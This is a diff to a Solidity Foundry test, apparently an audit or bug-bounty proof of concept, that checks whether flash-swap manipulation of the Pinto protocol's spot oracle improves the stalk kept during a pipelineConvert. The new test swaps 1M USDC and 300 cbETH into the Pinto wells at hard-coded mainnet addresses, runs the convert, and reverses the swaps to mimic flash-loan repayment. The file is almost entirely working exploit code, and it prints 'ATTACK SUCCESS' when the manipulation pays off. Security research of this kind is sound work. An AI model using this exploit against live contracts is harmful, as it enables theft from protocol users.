@@ -44,6 +44,8 @@ interface IWell {
 
 interface IERC20 {
     function approve(address spender, uint256 amount) external returns (bool);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
 }
 
 /**
@@ -71,7 +73,9 @@ contract OracleManipulationPoC is Test {
     address constant PINTO_DIAMOND = 0xD1A0D188E861ed9d15773a2F3574a2e94134bA8f;
     address constant PINTO_USDC_WELL = 0x3e1133aC082716DDC3114bbEFEeD8B1731eA9cb1;
     address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
+    address constant CBETH = 0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;
     address constant PINTO_TOKEN = 0xb170000aeeFa790fa61D6e837d1035906839a3c8;
+    address constant PINTO_CBETH_WELL = 0x3e111115A82dF6190e36ADf0d552880663A4dBF1;
     address constant PIPELINE = 0xb1bE0001f5a373b69b1E132b420e6D9687155e80;
     address constant DEPOSITOR = 0x56c7B85aE9f97b93bD19B98176927eeF63D039BE;
     
@@ -83,108 +87,138 @@ contract OracleManipulationPoC is Test {
     }
 
     /**
-     * @notice Verifies that SPOT can be manipulated while TWAP remains unchanged
+     * @notice Compares a normal penalized convert vs a manipulated one using snapshots.
+     * Demonstrates if oracle manipulation actually improves the outcome.
      */
-    function test_oracleDiscrepancy() public {
-        int256 twapBefore = pinto.overallCappedDeltaB();
-        int256 spotBefore = pinto.overallCurrentDeltaB();
+    function test_compareNormalVsManipulated() public {
+        console.log("=== COMPARISON: NORMAL VS MANIPULATED CONVERT ===");
 
-        _doLargeSwap(1_000_000e6);
-        
-        int256 twapAfter = pinto.overallCappedDeltaB();
-        int256 spotAfter = pinto.overallCurrentDeltaB();
-        
-        emit log_named_int("TWAP change", twapAfter - twapBefore);
-        emit log_named_int("SPOT change", spotAfter - spotBefore);
-        
-        assertEq(twapAfter, twapBefore, "TWAP should not change");
-        assertTrue(spotAfter != spotBefore, "SPOT should change");
-    }
-
-    /**
-     * @notice Full exploit: compares stalk outcome of normal vs manipulated convert
-     * @dev Expected result: Manipulated convert preserves more stalk
-     */
-    function test_fullExploit() public {
-        console.log("=== TWAP/SPOT Oracle Manipulation PoC ===");
-        
+        // 1. Setup common data
         TokenDepositId memory deposits = pinto.getTokenDepositsForAccount(DEPOSITOR, PINTO_TOKEN);
-        require(deposits.depositIds.length > 0, "No Bean deposits");
-        
-        (,int96 stem) = pinto.getAddressAndStem(deposits.depositIds[0]);
-        uint256 amount = uint256(deposits.tokenDeposits[0].amount);
-        
-        console.log("Bean Amount:", amount);
-        
+        uint256 depositIndex = 3;
+        (, int96 stem) = pinto.getAddressAndStem(deposits.depositIds[depositIndex]);
+        uint256 amount = uint256(deposits.tokenDeposits[depositIndex].amount);
+        uint256 bdvBefore = uint256(deposits.tokenDeposits[depositIndex].bdv);
+        uint256 grownBefore = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_TOKEN, stem);
+
+        console.log("Starting Bean BDV:", _format6(bdvBefore));
+        console.log("Starting Grown Stalk:", _format18(grownBefore));
+        console.log("Initial DeltaB:", _formatSigned6(pinto.overallCurrentDeltaB()));
+
         uint256 snapshotId = vm.snapshot();
-        
-        // Scenario A: Normal convert without manipulation
-        uint256 stalkAfterA = _runNormalConvert(stem, amount);
-        
-        vm.revertTo(snapshotId);
-        
-        // Scenario B: Convert after SPOT manipulation
-        uint256 stalkAfterB = _runManipulatedConvert(stem, amount);
-        
-        // Analysis
+
+        // --- Scenario A: Normal ---
         console.log("");
-        console.log("=== RESULTS ===");
-        console.log("Normal Convert Stalk:", stalkAfterA);
-        console.log("Manipulated Convert Stalk:", stalkAfterB);
+        console.log("--- Scenario A: Normal (No Manipulation) ---");
+        vm.prank(DEPOSITOR);
+        (int96 stemA, , , , uint256 bdvA) = pinto.pipelineConvert(
+            PINTO_TOKEN, _wrap(stem), _wrap(amount), PINTO_USDC_WELL, _createPipeCalls(amount)
+        );
+        uint256 grownA = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA);
+        console.log("Resulting Grown Stalk (Normal):", _format18(grownA));
+        console.log("Resulting BDV (Normal):        ", _format6(bdvA));
+        console.log("Total Stalk (Normal):          ", _format18(bdvA * 1e12 + grownA));
+
+        vm.revertTo(snapshotId);
+
+        // --- Scenario B: Manipulated ---
+        console.log("");
+        console.log("--- Scenario B: Manipulated (Flash Swap) ---");
+        console.log(">>> Swapping 1M USDC AND 300 cbETH -> Beans to push spot price ABOVE PEG <<<");
+        _doLargeSwap(1_000_000e6); 
+        _doLargeCbEthSwap(300 ether);
         
-        if (stalkAfterB > stalkAfterA) {
-            console.log("");
-            console.log("[VULNERABILITY CONFIRMED]");
-            console.log("Stalk Advantage:", stalkAfterB - stalkAfterA);
+        console.log("--- POST-MANIPULATION STATE ---");
+        console.log("Spot Overall DeltaB:   ", _formatSigned6(pinto.overallCurrentDeltaB()));
+        console.log("TWAP Overall DeltaB:   ", _formatSigned6(pinto.overallCappedDeltaB()));
+
+        vm.prank(DEPOSITOR);
+        (int96 stemB, , , , uint256 bdvB) = pinto.pipelineConvert(
+            PINTO_TOKEN, _wrap(stem), _wrap(amount), PINTO_USDC_WELL, _createPipeCalls(amount)
+        );
+        uint256 grownB = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB);
+        console.log("Resulting Grown Stalk (Manipulated):", _format18(grownB));
+        console.log("Resulting BDV (Manipulated):        ", _format6(bdvB));
+        console.log("Total Stalk (Manipulated):          ", _format18(bdvB * 1e12 + grownB));
+
+        // --- Reverse Swap (Simulate Flash Loan Repayment) ---
+        console.log("");
+        console.log(">>> REVERSING MANIPULATION: Swapping Beans back to USDC and cbETH <<<");
+        _doReverseSwap();
+        _doReverseCbEthSwap();
+        
+        console.log("--- POST-REVERSE STATE ---");
+        console.log("Spot Overall DeltaB:   ", _formatSigned6(pinto.overallCurrentDeltaB()));
+        console.log("TWAP Overall DeltaB:   ", _formatSigned6(pinto.overallCappedDeltaB()));
+        
+        // Check user's deposit BDV after reverse - it should remain the same (stored at deposit time)
+        uint256 grownBAfterReverse = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB);
+        console.log("User's Grown Stalk (after reverse):", _format18(grownBAfterReverse));
+        console.log("User's BDV remains:", _format6(bdvB), "(stored at deposit time!)");
+
+        // --- Final Comparison ---
+        console.log("");
+        console.log("=== FINAL COMPARISON ===");
+        console.log("Normal Grown Stalk:     ", _format18(grownA));
+        console.log("Manipulated Grown Stalk:", _format18(grownB));
+        console.log("Normal Total Stalk:     ", _format18(bdvA * 1e12 + grownA));
+        console.log("Manipulated Total Stalk:", _format18(bdvB * 1e12 + grownB));
+
+        if (grownB > grownA) {
+            console.log("ATTACK SUCCESS: Manipulation preserved more Grown Stalk.");
+            console.log("Advantage:", _format18(grownB - grownA));
+        } else if (grownB < grownA) {
+            console.log("ATTACK FAILED: Manipulation resulted in LESS Grown Stalk.");
+            console.log("Safety Loss:", _format18(grownA - grownB));
+        } else {
+            console.log("NO DIFFERENCE: Scaling perfectly nullified the manipulation.");
         }
     }
-    
-    function _runNormalConvert(int96 stem, uint256 amount) internal returns (uint256 stalkAfter) {
-        console.log("");
-        console.log("--- Scenario A: Normal Convert ---");
-        
-        uint256 stalkBefore = pinto.balanceOfStalk(DEPOSITOR);
-        uint256 grownStalk = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_TOKEN, stem);
-        
-        console.log("Stalk Before:", stalkBefore);
-        console.log("Grown Stalk:", grownStalk);
-        console.log("TWAP:"); console.logInt(pinto.overallCappedDeltaB());
-        console.log("SPOT:"); console.logInt(pinto.overallCurrentDeltaB());
-        
-        _doConvert(stem, amount);
-        
-        stalkAfter = pinto.balanceOfStalk(DEPOSITOR);
-        console.log("Stalk After:", stalkAfter);
+
+    function _wrap(int96 val) internal pure returns (int96[] memory) {
+        int96[] memory arr = new int96[](1);
+        arr[0] = val;
+        return arr;
     }
-    
-    function _runManipulatedConvert(int96 stem, uint256 amount) internal returns (uint256 stalkAfter) {
-        console.log("");
-        console.log("--- Scenario B: Manipulated Convert ---");
-        
-        uint256 stalkBefore = pinto.balanceOfStalk(DEPOSITOR);
-        int256 twapBefore = pinto.overallCappedDeltaB();
-        int256 spotBefore = pinto.overallCurrentDeltaB();
-        
-        console.log("Stalk Before:", stalkBefore);
-        console.log("TWAP:"); console.logInt(twapBefore);
-        console.log("SPOT:"); console.logInt(spotBefore);
-        
-        // Manipulate SPOT oracle
-        console.log("");
-        console.log(">>> Swap 1M USDC -> Pinto <<<");
-        _doLargeSwap(1_000_000e6);
-        
-        int256 spotAfter = pinto.overallCurrentDeltaB();
-        console.log("SPOT after manipulation:"); console.logInt(spotAfter);
-        console.log("SPOT change:"); console.logInt(spotAfter - spotBefore);
-        
-        // Convert with manipulated oracle
-        console.log("");
-        console.log(">>> Execute Convert <<<");
-        _doConvert(stem, amount);
-        
-        stalkAfter = pinto.balanceOfStalk(DEPOSITOR);
-        console.log("Stalk After:", stalkAfter);
+
+    function _wrap(uint256 val) internal pure returns (uint256[] memory) {
+        uint256[] memory arr = new uint256[](1);
+        arr[0] = val;
+        return arr;
+    }
+
+    function _format6(uint256 value) internal pure returns (string memory) {
+        uint256 integral = value / 1e6;
+        uint256 fractional = value % 1e6;
+        return string(abi.encodePacked(vm.toString(integral), ".", _pad6(fractional)));
+    }
+
+    function _formatSigned6(int256 value) internal pure returns (string memory) {
+        string memory sign = value < 0 ? "-" : "";
+        uint256 absVal = uint256(value < 0 ? -value : value);
+        return string(abi.encodePacked(sign, _format6(absVal)));
+    }
+
+    function _format18(uint256 value) internal pure returns (string memory) {
+        uint256 integral = value / 1e18;
+        uint256 fractional = value % 1e18;
+        return string(abi.encodePacked(vm.toString(integral), ".", _pad18(fractional)));
+    }
+
+    function _pad6(uint256 n) internal pure returns (string memory) {
+        string memory s = vm.toString(n);
+        while (bytes(s).length < 6) {
+            s = string(abi.encodePacked("0", s));
+        }
+        return s;
+    }
+
+    function _pad18(uint256 n) internal pure returns (string memory) {
+        string memory s = vm.toString(n);
+        while (bytes(s).length < 18) {
+            s = string(abi.encodePacked("0", s));
+        }
+        return s;
     }
 
     function _doLargeSwap(uint256 usdcAmount) internal {
@@ -196,20 +230,27 @@ contract OracleManipulationPoC is Test {
         IWell(PINTO_USDC_WELL).swapFrom(USDC, pintoToken, usdcAmount, 0, address(this), block.timestamp);
     }
 
-    function _doConvert(int96 stem, uint256 amount) internal {
-        AdvancedPipeCall[] memory pipeCalls = _createPipeCalls(amount);
-        
-        int96[] memory stems = new int96[](1);
-        stems[0] = stem;
-        
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = amount;
-        
-        vm.prank(DEPOSITOR);
-        try pinto.pipelineConvert(PINTO_TOKEN, stems, amounts, PINTO_USDC_WELL, pipeCalls) {
-            console.log("Convert successful");
-        } catch Error(string memory reason) {
-            console.log("Convert failed:", reason);
+    function _doLargeCbEthSwap(uint256 cbEthAmount) internal {
+        deal(CBETH, address(this), cbEthAmount);
+        IERC20(CBETH).approve(PINTO_CBETH_WELL, type(uint256).max);
+        IWell(PINTO_CBETH_WELL).swapFrom(CBETH, PINTO_TOKEN, cbEthAmount, 0, address(this), block.timestamp);
+    }
+
+    function _doReverseSwap() internal {
+        // Swap all beans we got from the manipulation back to USDC
+        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(address(this));
+        if (beanBalance > 0) {
+            IERC20(PINTO_TOKEN).approve(PINTO_USDC_WELL, type(uint256).max);
+            IWell(PINTO_USDC_WELL).swapFrom(PINTO_TOKEN, USDC, beanBalance, 0, address(this), block.timestamp);
+        }
+    }
+
+    function _doReverseCbEthSwap() internal {
+        // Swap remaining beans back to cbETH
+        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(address(this));
+        if (beanBalance > 0) {
+            IERC20(PINTO_TOKEN).approve(PINTO_CBETH_WELL, type(uint256).max);
+            IWell(PINTO_CBETH_WELL).swapFrom(PINTO_TOKEN, CBETH, beanBalance, 0, address(this), block.timestamp);
         }
     }
 
